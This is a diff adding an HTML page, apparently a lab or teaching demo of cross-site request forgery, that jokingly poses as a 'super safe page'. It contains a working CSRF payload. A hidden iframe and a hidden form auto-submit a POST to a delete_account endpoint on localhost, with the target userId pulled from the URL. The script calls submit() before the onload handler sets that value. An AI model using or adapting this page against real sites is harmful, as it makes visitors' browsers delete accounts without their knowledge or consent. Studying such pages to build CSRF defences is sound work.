@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malici- I mean super safe page 😳</title>
+</head>
+<body>
+  <h1>Hello welcome to the best website ever</h1>
+
+  <p>We have unbeatable security, look :</p>
+  <img src="../../img/lock.gif" alt="Super secure website man I swear">
+
+  <!-- We lied mdrrrr -->
+  <iframe name="ez_csrf_iframe" style="display: none;"></iframe>
+  <form
+    id="ez_csrf_form"
+    target="ez_csrf_iframe"
+    action="http://localhost:8080/delete_account"
+    enctype="multipart/form-data"
+    method="POST"
+  >
+    <input type="hidden" id="ez_delete" name="userId" value="" />
+    <input type="submit" value="Submit request">
+  </form>
+  <script>
+    window.onload = () => {
+      const url = new URL(window.location.href);
+      const del = url.searchParams.get("delete");
+
+      document.getElementById('ez_delete').value = del;
+    }
+
+    document.getElementById('ez_csrf_form').submit();
+  </script>
+</body>
+</html>
